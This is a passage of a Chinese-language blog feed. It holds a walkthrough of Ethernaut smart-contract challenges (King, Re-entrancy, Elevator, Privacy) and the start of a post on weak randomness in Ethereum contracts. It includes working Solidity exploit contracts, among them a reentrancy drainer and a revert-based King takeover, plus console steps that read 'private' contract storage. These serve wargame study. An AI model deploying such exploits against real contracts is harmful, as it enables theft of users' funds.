href="#攻击流程-7" class="headerlink" title="攻击流程"></a>攻击流程</h3><ol><li><p><code>web3.eth.getStorageAt(contract.address, 1)</code></p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220223161137206.png" alt="image-20220223161137206"></p></li><li><p><code>contract.unlock(&#39;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&#39;)</code></p><p>均报错</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/918b31ad3155cfc4d5e4bdd4e9841d5.png" alt="918b31ad3155cfc4d5e4bdd4e9841d5"></p><p>成功</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220223161340419.png" alt="image-20220223161340419"></p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220223161409985.png" alt="image-20220223161409985"></p></li></ol><h2 id="9-King"><a href="#9-King" class="headerlink" title="9. King"></a>9. King</h2><h3 id="闯关要求-8"><a href="#闯关要求-8" class="headerlink" title="闯关要求"></a>闯关要求</h3><p>下面的合约表示了一个很简单的游戏: 任何一个发送了高于目前价格的人将成为新的国王. 在这个情况下, 上一个国王将会获得新的出价, 这样可以赚得一些以太币. 看起来像是庞氏骗局.</p><p>这么有趣的游戏, 你的目标是攻破他.</p><p>当你提交实例给关卡时, 关卡会重新申明王位. 你需要阻止他重获王位来通过这一关.</p><h3 id="合约代码-8"><a href="#合约代码-8" class="headerlink" title="合约代码"></a>合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract King &#123;<br><br>  address payable king;<br>  uint public prize;<br>  address payable public owner;<br><br>  constructor() public payable &#123;<br>    owner = msg.sender;  <br>    king = msg.sender;<br>    prize = msg.value;<br>  &#125;<br><br>  receive() external payable &#123;<br>    require(msg.value &gt;= prize || msg.sender == owner);<br>    king.transfer(msg.value);<br>    king = msg.sender;<br>    prize = msg.value;<br>  &#125;<br><br>  function _king() public view returns (address payable) &#123;<br>    return king;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="合约分析-8"><a href="#合约分析-8" class="headerlink" title="合约分析"></a>合约分析</h3><p>只要国王拒绝接收奖励即可一直当国王。那么我们可以部署攻击合约，使用 <code>revert()</code> 占据合约的king不放</p><h3 id="攻击流程-8"><a href="#攻击流程-8" class="headerlink" title="攻击流程"></a>攻击流程</h3><ol><li><p>查询目前最高价</p><p><code>web3.utils.fromWei</code> 能将给定的以wei为单位的值转换为其他单位的数值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js">web3.utils.fromWei(<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;ether&#x27;</span>); <span class="hljs-comment">//默认</span><br>&gt; <span class="hljs-string">&quot;0.000000000000000001&quot;</span><br><br>web3.utils.fromWei(<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;finney&#x27;</span>);<br>&gt; <span class="hljs-string">&quot;0.000000000000001&quot;</span><br><br>web3.utils.fromWei(<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;szabo&#x27;</span>);<br>&gt; <span class="hljs-string">&quot;0.000000000001&quot;</span><br><br>web3.utils.fromWei(<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;shannon&#x27;</span>);<br>&gt; <span class="hljs-string">&quot;0.000000001&quot;</span><br></code></pre></td></tr></table></figure><p>直接使用 <code>fromWei(contract.prize)</code> 会报错</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220223220836386.png" alt="image-20220223220836386"></p><p>可使用 <code>toBN()</code> 转换一下</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220223220944150.png" alt="image-20220223220944150"></p><p>即出价比0.001ether高即可</p></li><li><p>查询现在的king</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220223221109151.png" alt="image-20220223221109151"></p></li><li><p>部署合约</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity 0.4.18;<br><br>contract attack &#123;<br>    function attack(address _add) public payable &#123;<br>        _add.call.gas(1000000).value(msg.value)();<br>    &#125;<br><br>    function () public &#123;<br>        revert();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>提交实例</p><p>可以看到再次查询king的地址变为了攻击合约的地址</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220223221202590.png" alt="image-20220223221202590"></p></li></ol><h2 id="10-Re-entrancy"><a href="#10-Re-entrancy" class="headerlink" title="10. Re-entrancy"></a>10. Re-entrancy</h2><h3 id="闯关要求-9"><a href="#闯关要求-9" class="headerlink" title="闯关要求"></a>闯关要求</h3><p>这一关的目标是偷走合约的所有资产.</p><h3 id="合约代码-9"><a href="#合约代码-9" class="headerlink" title="合约代码"></a>合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;<br><br>contract Reentrance &#123;<br>  <br>  using SafeMath for uint256;<br>  mapping(address =&gt; uint) public balances;<br><br>  function donate(address _to) public payable &#123;<br>    balances[_to] = balances[_to].add(msg.value);<br>  &#125;<br><br>  function balanceOf(address _who) public view returns (uint balance) &#123;<br>    return balances[_who];<br>  &#125;<br><br>  function withdraw(uint _amount) public &#123;<br>    if(balances[msg.sender] &gt;= _amount) &#123;<br>      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);<br>      if(result) &#123;<br>        _amount;<br>      &#125;<br>      balances[msg.sender] -= _amount;<br>    &#125;<br>  &#125;<br><br>  receive() external payable &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="合约分析-9"><a href="#合约分析-9" class="headerlink" title="合约分析"></a>合约分析</h3><p>重入</p><h3 id="攻击流程-9"><a href="#攻击流程-9" class="headerlink" title="攻击流程"></a>攻击流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.6.10;<br><br>import &quot;@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol&quot;;<br><br>contract Reentrance &#123;<br>  <br>  using SafeMath for uint256;<br>  mapping(address =&gt; uint) public balances;<br><br>  function donate(address _to) public payable &#123;<br>    balances[_to] = balances[_to].add(msg.value);<br>  &#125;<br><br>  function balanceOf(address _who) public view returns (uint balance) &#123;<br>    return balances[_who];<br>  &#125;<br><br>  function withdraw(uint _amount) public &#123;<br>    if(balances[msg.sender] &gt;= _amount) &#123;<br>      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);<br>      if(result) &#123;<br>        _amount;<br>      &#125;<br>      balances[msg.sender] -= _amount;<br>    &#125;<br>  &#125;<br><br>  receive() external payable &#123;&#125;<br>&#125;<br><br>contract exploit &#123; <br>  //设定目标合约地址<br>  Reentrance reentrance;<br>  constructor(address payable instance_add) public payable &#123;<br>    reentrance = Reentrance(instance_add);<br>  &#125;<br><br>  //重写fallback<br>  fallback() external payable &#123;<br>    if(address(reentrance).balance &gt;= 0 ether)&#123;<br>      reentrance.withdraw(0.001 ether);<br>    &#125;<br>  &#125;<br><br>  //攻击，调用withdraw<br>  function attack() external &#123;<br>    reentrance.donate&#123;value: 0.002 ether&#125;(address(this));<br>    reentrance.withdraw(0.001 ether);<br>  &#125;<br><br>  //查询余额<br>  function instance_balance() public view returns (uint) &#123;<br>    return address(reentrance).balance;<br>  &#125;<br><br>   <br>&#125;<br><br></code></pre></td></tr></table></figure><p>部署合约时打入一些钱</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220224201600577.png" alt="image-20220224201600577"></p><p>使用函数查询实例合约中原有余额</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220224171227027.png" alt="image-20220224171227027"></p><p>攻击完成后再次查询余额</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220224201734086.png" alt="image-20220224201734086"></p><p>也可以在控制台中查询</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220224201803486.png" alt="image-20220224201803486"></p><h2 id="11-Elevator"><a href="#11-Elevator" class="headerlink" title="11. Elevator"></a>11. Elevator</h2><h3 id="闯关要求-10"><a href="#闯关要求-10" class="headerlink" title="闯关要求"></a>闯关要求</h3><p>电梯不会让你达到大楼顶部, 对吧?</p><h3 id="合约代码-10"><a href="#合约代码-10" class="headerlink" title="合约代码"></a>合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>interface Building &#123;<br>  function isLastFloor(uint) external returns (bool);<br>&#125;<br><br><br>contract Elevator &#123;<br>  bool public top;<br>  uint public floor;<br><br>  function goTo(uint _floor) public &#123;<br>    Building building = Building(msg.sender);<br><br>    if (! building.isLastFloor(_floor)) &#123;<br>      floor = _floor;<br>      top = building.isLastFloor(floor);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="合约分析-10"><a href="#合约分析-10" class="headerlink" title="合约分析"></a>合约分析</h3><p>重新编写isLastFloor函数，并设置flag初始为true。在实例的goTo函数中，会调用两次isLastFloor函数，即第一次让flag变为false，第二次让flag变为true</p><h3 id="攻击流程-10"><a href="#攻击流程-10" class="headerlink" title="攻击流程"></a>攻击流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.6.0;<br><br>interface Building &#123;<br>  function isLastFloor(uint) external returns (bool);<br>&#125;<br><br><br>contract Elevator &#123;<br>  bool public top;<br>  uint public floor;<br><br>  function goTo(uint _floor) public &#123;<br>    Building building = Building(msg.sender);<br><br>    if (! building.isLastFloor(_floor)) &#123;<br>      floor = _floor;<br>      top = building.isLastFloor(floor);<br>    &#125;<br>  &#125;<br>&#125;<br><br>contract exploit &#123;<br>    address instance_add = 0x98aD02A12F92eADb16dcF5285568CA7826B4b947;<br>    Elevator elevator = Elevator(instance_add);<br>    bool flag = true;<br><br>    function isLastFloor(uint) external returns (bool) &#123;<br>        flag = !flag;<br>        return flag;<br>    &#125;<br><br>    function attack() public &#123;<br>        elevator.goTo(5);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>查看top状态并提交实例</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220224190112002.png" alt="image-20220224190112002"></p><h2 id="12-Privacy"><a href="#12-Privacy" class="headerlink" title="12. Privacy"></a>12. Privacy</h2><h3 id="闯关要求-11"><a href="#闯关要求-11" class="headerlink" title="闯关要求"></a>闯关要求</h3><p>这个合约的制作者非常小心的保护了敏感区域的 storage.</p><p>解开这个合约来完成这一关.</p><h3 id="合约代码-11"><a href="#合约代码-11" class="headerlink" title="合约代码"></a>合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract Privacy &#123;<br><br>  bool public locked = true;<br>  uint256 public ID = block.timestamp;<br>  uint8 private flattening = 10;<br>  uint8 private denomination = 255;<br>  uint16 private awkwardness = uint16(now);<br>  bytes32[3] private data;<br><br>  constructor(bytes32[3] memory _data) public &#123;<br>    data = _data;<br>  &#125;<br>  <br>  function unlock(bytes16 _key) public &#123;<br>    require(_key == bytes16(data[2]));<br>    locked = false;<br>  &#125;<br><br>  /*<br>    A bunch of super advanced solidity algorithms...<br><br>      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`<br>      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,<br>      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\<br>      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)<br>      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU<br>  */<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="合约分析-11"><a href="#合约分析-11" class="headerlink" title="合约分析"></a>合约分析</h3><p>升级版vault，用 <code>getStorageAt()</code> 把链上的数据读出来</p><h3 id="攻击流程-11"><a href="#攻击流程-11" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>根据优化存储原则：如果下一个变量长度和上一个变量长度加起来不超过256bits（32字节），它们就会存储在同一个插槽里</p><p>通过查询得到</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220224214603113.png" alt="image-20220224214603113"></p><p>可以分析</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs js">web3.eth.getStorageAt(contract.address,<span class="hljs-number">0</span>)<br><span class="hljs-comment">//0x0000000000000000000000000000000000000000000000000000000000000001  </span><br><span class="hljs-comment">//locked = true 1字节 01</span><br><br>web3.eth.getStorageAt(contract.address,<span class="hljs-number">1</span>)<br><span class="hljs-comment">//0x0000000000000000000000000000000000000000000000000000000062178997  </span><br><span class="hljs-comment">//ID = block.timestamp 常量</span><br><br>web3.eth.getStorageAt(contract.address,<span class="hljs-number">2</span>)<br><span class="hljs-comment">//0x000000000000000000000000000000000000000000000000000000008997ff0a </span><br><span class="hljs-comment">// flattening = 10 1字节 0a</span><br><span class="hljs-comment">//denomination = 255 1字节 ff</span><br><span class="hljs-comment">//awkwardness = uint16(now) 2字节</span><br><br>web3.eth.getStorageAt(contract.address,<span class="hljs-number">3</span>)<br><span class="hljs-comment">//0xf29eea5d3875c68825a80d9c459dec52f5bbd55dd5ce827e00ec92ae60f7ddb2  </span><br><span class="hljs-comment">//data[0]</span><br><br>web3.eth.getStorageAt(contract.address,<span class="hljs-number">4</span>)<br><span class="hljs-comment">//0x153a7c6b4bf25f3a526a687713411c5ca83ae18c6f8950ff0f09be93bd36cb95  </span><br><span class="hljs-comment">//data[1]</span><br><br>web3.eth.getStorageAt(contract.address,<span class="hljs-number">5</span>)<br><span class="hljs-comment">//0x0b444a369c67e1d2436e5410d7c891644b6f088cb5f3451cc11f5ae67c451e18  </span><br><span class="hljs-comment">//data[2]</span><br><br></code></pre></td></tr></table></figure><p>所以解锁需要的data[2]应该是0x0b444a369c67e1d2436e5410d7c89164</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">contract.unlock(<span class="hljs-string">&#x27;0x0b444a369c67e1d2436e5410d7c89164&#x27;</span>)<br></code></pre></td></tr></table></figure><p>检查解锁成功</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220224220625238.png" alt="image-20220224220625238"></p><p>提交实例</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220224220653313-16459470826481.png" alt="image-20220224220653313"></p>]]></content>
    
    
    
    <tags>
      
      <tag>靶场刷题</tag>
      
      <tag>Etherum</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>智能合约错误随机性</title>
    <link href="/2021/11/14/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%94%99%E8%AF%AF%E9%9A%8F%E6%9C%BA%E6%80%A7/"/>
    <url>/2021/11/14/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%94%99%E8%AF%AF%E9%9A%8F%E6%9C%BA%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="错误随机性"><a href="#错误随机性" class="headerlink" title="错误随机性"></a>错误随机性</h1><p>智能合约开发中，在程序中使用随机数较好的伪随机数是很难的。很多看似无法被预言的随机数种子或变量，实际被预言的难度很低。</p><p>核心问题：一旦在智能合约中使用了随机性很差的随机数作为关键变量，就面临着随机数被预言的攻击风险。</p><h2 id="PRNG相关漏洞类型"><a href="#PRNG相关漏洞类型" class="headerlink" title="PRNG相关漏洞类型"></a>PRNG相关漏洞类型</h2><p>开发者生成随机数时，一般都会使用伪随机数生成器(pseudo-random number generator)，简称 <code>PRNG</code>。而有漏洞的PRNG，一般有三种类型：</p><blockquote><ol><li><p>使用区块变量作为熵源的 PRNG</p></li><li><p>基于过往区块(和私有种子)的区块哈希的 PRNG</p></li><li><p>易被抢占交易(front-running)的 PRNG</p></li></ol></blockquote><h3 id="使用区块变量作为熵源"><a href="#使用区块变量作为熵源" class="headerlink" title="使用区块变量作为熵源"></a>使用区块变量作为熵源</h3><blockquote><p><code>block.coinbase</code> 表示当前区块的矿工地址</p><p><code>block.difficulty</code> 表示当前区块的挖掘难度</p><p><code>block.gaslimit</code> 区块内交易的最大限制燃气消耗量</p><p><code>block.number</code> 表示当前区块高度</p><p><code>block.timestamp</code> 表示当前区块挖掘时间</p></blockquote><p>以上所有的区块变量都可以被矿工操纵，所以都不能用来做信息熵源。因为这些区块变量在同一区块上是共用的。攻击者通过其恶意合约调用受害者合约，那么此交易打包在同一区块中，其区块变量是一样的。</p><h3 id="基于过往区块的区块哈希"><a href="#基于过往区块的区块哈希" class="headerlink" title="基于过往区块的区块哈希"></a>基于过往区块的区块哈希</h3><p>每一个Ethereum区块链上的区块都有认证的hash值，通过 <code>block.blockhash()</code> 函数可以获取此值。此函数经常被错误地使用。</p><blockquote><p><code>block.blockhash(block.number)</code> ：基于当前区块的区块哈希</p><p><code>block.blockhash(block.number - 1)</code> ： 基于负一区块的区块哈希</p><p><code>Blockhash of a future block</code> : 使用未来区块的区块哈希</p><p><code>Blockhash with a private seed</code> : 使用一个私有种子(seed)变量</p></blockquote><h4 id="基于当前区块的区块哈希"><a href="#基于当前区块的区块哈希" class="headerlink" title="基于当前区块的区块哈希"></a>基于当前区块的区块哈希</h4><p>通过 <code>block.number</code> 变量可以获取当前区块区块高度。但是还没执行时，这个“当前区块”是一个未来区块，即只有当一个矿工拾取一个执行合约代码的交易时，这个未来区块才变为当前区块，所以合约才可以可靠地获取此区块的区块哈希。而一些合约曲解了<code>block.blockhash(block.number)</code> 的含义，误认为当前区块的区块哈希在运行过程中是已知的，并将之做为熵源。还有一点就是在以太坊虚拟机中(EVM)，区块哈希恒为 0。</p><h4 id="基于负一区块的区块哈希"><a href="#基于负一区块的区块哈希" class="headerlink" title="基于负一区块的区块哈希"></a>基于负一区块的区块哈希</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint256 random = uint256(keccak256(block.blockhash(block.number - 1)));<br></code></pre></td></tr></table></figure><p>这样的方式，虽然理论上可以获得随机数，但这个随机数是不安全的。因为攻击者可以使用改造后的<code>FullNode</code>，让这笔交易可以在<code>FullNode</code>上执行，并获得结果后，再选择性广播那些可以符合攻击者期望的交易，即可以操纵交易的执行结果。</p><p>攻击合约只要以相同代码执行，即可以产生到同样的伪随机数。</p><h4 id="使用未来区块的区块哈希"><a href="#使用未来区块的区块哈希" class="headerlink" title="使用未来区块的区块哈希"></a>使用未来区块的区块哈希</h4><p>第一笔交易触发合约，合约存储某个未来区块高度。</p><p>第二笔交易，合约检索当前区块高度，如果超过了存储的未来区块高度，则通过区块哈希获得伪随机数结果。</p><p>然而，这种方式也有它的局限性：在TVM中，<code>blockhash</code>被限定为只能获取近256个高度区块的数据，因此在以上的两笔交易间隔超过256 * 3s，大约12.8分钟后，这种方式就会失效。</p><p>此方法只有在十分必要的时候才能使用。因为也存在一定危险性，EVM 能存储的区块哈希为最近的 256 条。超过的话值为 0。</p><h3 id="易被抢占交易-front-running"><a href="#易被抢占交易-front-running" class="headerlink" title="易被抢占交易(front-running)"></a>易被抢占交易(front-running)</h3><p>原理：更高的 gas 价格，交易将更快被矿工拾取打包。</p><p>为了获取最大的奖励，矿工通过每个交易的 gas 累积值来选择并创建新的区块。而这些交易的排序是基于它们的 gas 价格。最高的 gas 价格会先被执行。由此通过操纵 gas 价格，可以将交易的顺序排在当前区块的前面。这就会引发抢占交易问题。</p><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><h4 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h4><p>Ganache CLI使用ethereumjs来模拟完整的客户端行为，使开发以太坊应用程序更快，更轻松，更安全。它还包括所有主流的RPC函数和功能（如event），并可以准确地运行以使开发变得容易。</p><p>在后文的复现中，由于在remix中使用VM会报错，所以会使用ganache-cli来进行模拟。</p><p>ganache-cli是用Javascript编写的，并通过npm作为Node包进行分发。安装之前首先要确保安装了Node.js（&gt; = v6.11.5），可以使用<code>node -v</code>来检查自己的Node.js的版本</p><p>安装</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">npm install -g ganache-<span class="hljs-keyword">cli</span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%94%99%E8%AF%AF%E9%9A%8F%E6%9C%BA%E6%80%A7/image-20211109204427759.png" alt="image-20211109204427759"></p><p>启动</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">ganache-<span class="hljs-keyword">cli</span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%94%99%E8%AF%AF%E9%9A%8F%E6%9C%BA%E6%80%A7/image-20211109204511611.png" alt="image-20211109204511611"></p><h4 id="漏洞demo"><a href="#漏洞demo" class="headerlink" title="漏洞demo"></a>漏洞demo</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.6.10;<br><br>contract GuessTheRandomNumber &#123;<br>    constructor() public payable &#123;<br>        <br>    &#125;<br>    <br>    //s<br>    function guess(uint guess) public &#123;<br>        uint answer = uint(keccak256(abi.encodePacked(<br>            blockhash(block.number - 1),<br>            block.timestamp<br>            )));<br>            <br>        if (guess == answer) &#123;<br>            (bool sent, ) = msg.sender.call&#123;value: 1 ether&#125;(&quot;&quot;);<br>            require(sent, &quot;Failed to send Ether&quot;);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="攻击合约"><a href="#攻击合约" class="headerlink" 